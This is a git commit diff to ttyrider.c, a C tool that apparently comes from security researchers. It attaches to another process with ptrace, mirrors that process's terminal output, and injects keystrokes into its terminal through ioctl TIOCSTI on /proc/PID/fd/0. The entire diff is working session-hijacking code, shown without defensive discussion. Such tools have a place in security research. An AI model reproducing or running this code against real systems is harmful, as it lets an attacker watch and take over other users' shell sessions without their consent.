a2e6a9041ea5126d1454fb678eba0ae2af7ccf84
Scott Zimmermann <szimmermann@isecpartners.com>
2015-04-22 16:54:56 -0400

    sending input

--- ttyrider.c
+++ ttyrider.c
@@ -2,36 +2,35 @@
 #include <stdlib.h>
 #include <string.h>
 #include <syscall.h>
+#include <fcntl.h>
 #include <sys/ptrace.h>
 #include <sys/types.h>
 #include <sys/wait.h>
 #include <sys/reg.h>
 #include <sys/user.h>
+#include <sys/ioctl.h>
 #define MIN(a,b) (((a) < (b)) ? (a) : (b))
 
-int main(int argc, char **argv) {
-    pid_t target_pid = atoi(argv[1]);
-    int target_fd = atoi(argv[2]);
-
-    ptrace(PTRACE_ATTACH, target_pid, 0, 0);
+void mirror_output(pid_t pid, int fd) {
+    ptrace(PTRACE_ATTACH, pid, 0, 0);
     wait(0);
 
     while(1) {
-        ptrace(PTRACE_SYSCALL, target_pid, 0, 0);
+        ptrace(PTRACE_SYSCALL, pid, 0, 0);
         wait(0);
         struct user_regs_struct regs;
-        ptrace(PTRACE_GETREGS, target_pid, 0, &regs);
+        ptrace(PTRACE_GETREGS, pid, 0, &regs);
         /* ssize_t write(int fd, const void *buf, size_t count)
          * fd:   regs.rdi
          * buf:  regs.rsi
          * size: regs.rdx
          */
-        if(regs.orig_rax == SYS_write && regs.rdi == target_fd) {
+        if(regs.orig_rax == SYS_write && regs.rdi == fd) {
             int i;
             char *buf = malloc(regs.rdx);
 
             for(i = 0; i < regs.rdx; i += sizeof(long)) {
-                long val = ptrace(PTRACE_PEEKDATA, target_pid, regs.rsi + i, 0);
+                long val = ptrace(PTRACE_PEEKDATA, pid, regs.rsi + i, 0);
                 memcpy(buf + i, &val, MIN(sizeof(long), regs.rdx - i));
             }
 
@@ -39,7 +38,25 @@ int main(int argc, char **argv) {
             free(buf);
         }
         // don't check return value 
-        ptrace(PTRACE_SYSCALL, target_pid, 0, 0);
+        ptrace(PTRACE_SYSCALL, pid, 0, 0);
         wait(0);
     }
+}
+
+int main(int argc, char **argv) {
+    /* mirror output in child */
+    if(fork() == 0)
+        mirror_output(atoi(argv[1]), atoi(argv[2]));
+
+    /* in parent go on to send them our input */
+    char devname[80];
+    snprintf(devname, sizeof(devname), "/proc/%s/fd/0", argv[1]);
+    int fd = open(devname, O_WRONLY);
+    while(1) {
+        char c = getchar();
+        ioctl(fd, TIOCSTI, &c);
+    }
+
+    /* wait on ptrace-ing child to finish */
+    wait(0);
 }
